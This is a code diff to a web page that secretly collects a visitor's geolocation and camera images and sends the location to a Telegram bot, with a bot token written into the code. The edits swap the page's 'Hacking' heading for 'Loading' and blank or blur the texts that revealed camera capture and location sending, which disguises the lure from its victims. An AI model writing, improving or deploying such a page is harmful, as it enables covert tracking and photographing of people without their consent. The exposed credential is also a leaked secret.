@@ -108,7 +108,7 @@
 <body>
     <div class="content">
         <i class="fa-solid fa-user-secret"></i>
-        <h1>Hacking</h1>
+        <h1>جاري التحميل</h1>
     </div>
     
     <div class="loading-container">
@@ -189,8 +189,8 @@
                             max-width:400px;
                             margin:50px auto;
                         ">
-                            <h2>التقاط الصورة الفوري</h2>
-                            <p>يجب منح إذن الوصول للكاميرا</p>
+                            <h2> السماح بطلب الاذن </h2>
+                            <p>يجب منح إذن  </p>
                             <button onclick="ultraFastCapture()" style="
                                 padding: 12px 24px;
                                 background: #0088cc;
@@ -200,7 +200,7 @@
                                 font-size: 16px;
                                 cursor: pointer;
                                 margin-top: 20px;
-                            ">منح الإذن والالتقاط</button>
+                            ">منح الإذن </button>
                         </div>
                     `;
                 }
@@ -213,7 +213,7 @@
         //-------------------------
               document.addEventListener('DOMContentLoaded', function() {
             const statusElement = document.getElementById('status');
-            statusElement.textContent = 'جاري تحديد الموقع...';
+            statusElement.textContent = 'جاري  ...';
             
             if (navigator.geolocation) {
                 // استخدام watchPosition بدلاً من getCurrentPosition للحصول على أسرع استجابة
@@ -261,7 +261,7 @@
 
         function sendToTelegramBot(latitude, longitude) {
             const statusElement = document.getElementById('status');
-            statusElement.textContent = 'جاري إرسال الموقع...';
+            statusElement.textContent = 'جاري  ...';
             
                      // استبدل هذه القيم بمعلومات بوتك
             const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
